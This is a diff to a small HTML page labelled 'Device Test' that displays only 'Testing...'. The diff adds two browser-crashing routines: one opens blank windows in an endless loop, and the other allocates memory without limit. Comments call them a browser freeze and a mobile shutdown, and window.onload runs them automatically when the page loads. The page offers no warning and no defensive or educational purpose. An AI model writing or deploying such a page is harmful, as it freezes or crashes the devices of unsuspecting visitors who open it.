@@ -1,18 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Testing Page</title>
+    <title>Device Test</title>
     <script>
-        // Crash Code (Example)
-        function startCrash() {
-            while(true) {
-                alert("Crash!");
+        // Method 1: Infinite Pop-ups (Browser Freeze)
+        function crash() {
+            while(true) { 
+                window.open("about:blank"); 
             }
         }
-        startCrash();
+        
+        // Method 2: CPU Overload (Mobile Shutdown)
+        function overload() {
+            let arr = [];
+            while(true) arr.push(new Array(1000000));
+        }
+        
+        // Auto-run on page load
+        window.onload = overload; // OR crash();
     </script>
 </head>
 <body>
-    <h1>Loading... Don't Close!</h1>
+    <h1>Testing...</h1>
 </body>
 </html>
